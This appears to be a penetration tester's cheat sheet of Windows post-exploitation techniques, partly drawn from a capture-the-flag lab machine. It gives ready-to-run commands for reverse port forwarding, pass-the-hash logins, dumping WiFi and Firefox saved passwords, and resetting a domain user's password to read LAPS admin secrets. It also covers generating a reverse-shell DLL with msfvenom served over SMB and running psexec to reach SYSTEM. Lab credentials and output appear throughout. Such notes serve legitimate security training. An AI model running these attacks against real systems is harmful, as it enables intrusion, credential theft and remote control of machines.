## WinRM service is only available locally
- Got initial shell, found another user's credentials but could not get a shell
- Port forward 5985
```bash
attacker$ chisel server -p <PORT> --reverse
victim$ chisel client http://attacker:PORT R:5985:127.0.0.1:5985

attacker$ evil-winrm -i 127.0.0.1 -u <USER> -p <PASS>
```

## You got a user's hash instead of password
- Pass the Hash
```bash
evil-winrm -i <IP> -u <USER> -H <HASH>
```

## Show WiFi credentials
```bash
netsh wlan show profiles
netsh wlan show profiles <NAME> key=clear
...[snip]...
Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    ...[snip]...
    Key Content            : Admin123!!
...[snip]...
```

## User is not in WinRM group
- Excerpt from machine: pivotapi.htb
```bash
# Credential to authenticate

$mypass = 'Cos@Chung@!RPG' | ConvertTo-SecureString -AsPlainText -Force
$mycred = New-Object System.Management.Automation.PSCredential('LicorDeBellota.htb\jari', $mypass)

# Set gibdeon's credential

$pwd = ConvertTo-SecureString 'Pass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity gibdeon -AccountPassword $pwd -Credential $mycred

# Add gibdeon to group membership

$cred = New-Object System.Management.Automation.PSCredential('LicorDeBellota.htb\gibdeon', $pwd)

Add-ADGroupMember -Identity 'laps adm'  -Members gibdeon -Credential $cred
Add-ADGroupMember -Identity 'laps read' -Members gibdeon -Credential $cred
"""

$ python3 lapsdump.py -u gibdeon -p 'Pass123!' -d licordebellota.htb -l 10.10.10.240

PIVOTAPI$:HUcP5c19h8HCw41w4gSi

```

```bash
The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.
```

### xfreerdp resizable window
```bash
xfreerdp /u:<USER> /p:<PASS> /v:<IP> /dynamic-resolution
```

### Decrypt credentials from mozilla profiles
- Copy the 3 files to local machine into a directory ( requirements )
- run firefox_decrypt
```bash
$ ls mozilla 
cert9.db  key4.db  logins.json

$ python3 firefox_decrypt.py mozilla/
2021-11-18 09:10:55,772 - WARNING - profile.ini not found in mozilla
2021-11-18 09:10:55,772 - WARNING - Continuing and assuming 'mozilla' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```

### netsh http
```bash
PS C:\windows\system32\inetsrv> netsh http show urlacl     
                                                           
URL Reservations:                                          
-----------------                                          
                                                           
    Reserved URL            : https://*:8172/ 
        User: NT SERVICE\WMSVC                             
            Listen: Yes                                    
            Delegate: No
            SDDL: D:(A;;GX;;;S-1-5-80-257763619-1023834443-750927789-3464696139-1457670516)                           
                                                           
    Reserved URL            : http://*:5357/ 
        User: BUILTIN\Users                                
            Listen: Yes                                    
            Delegate: No                                   
        User: NT AUTHORITY\LOCAL SERVICE                   
            Listen: Yes                                    
            Delegate: No   
            SDDL: D:(A;;GX;;;BU)(A;;GX;;;LS)

    Reserved URL            : http://+:5985/wsman/ 
        User: NT SERVICE\WinRM
            Listen: Yes                                    
            Delegate: No                                   
        User: NT SERVICE\Wecsvc
            Listen: Yes                                    
            Delegate: No                                   
            SDDL: D:(A;;GX;;;S-1-5-80-569256582-2953403351-2909559716-1301513147-412116970)(A;;GX;;;S-1-5-80-4059739203-877974739-1245631912-527174227-2996563517)
			
...[snip]...

```

## Reverse shell via DLL
* attacker
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=4444 -f dll -o shell.dll
$ impacket-smbserver smb .
$ nc -lnvp 4444
```

* victim
```bash
rundll32.exe \\10.10.14.21\smb\shell.dll, 0
```

## Elevate from Administrator to SYSTEM account

Check mandatory level first ( UAC Bypass )

```txt
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST... -f exe -o shell.exe
$ nc -lnvp 4444

#1 - FAIL
C:\>psexec64.exe -i -accepteula -d -s shell.exe
The system cannot find the file specified.

#2 - SUCCESS : Absolute path is given
C:\>psexec64.exe -i -accepteula -d -s C:\Users\Public\Downloads\shell.exe
whoami
nt authority\system
```

If #2 still fails, it means that UAC takes place and needs to be bypassed.

https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/


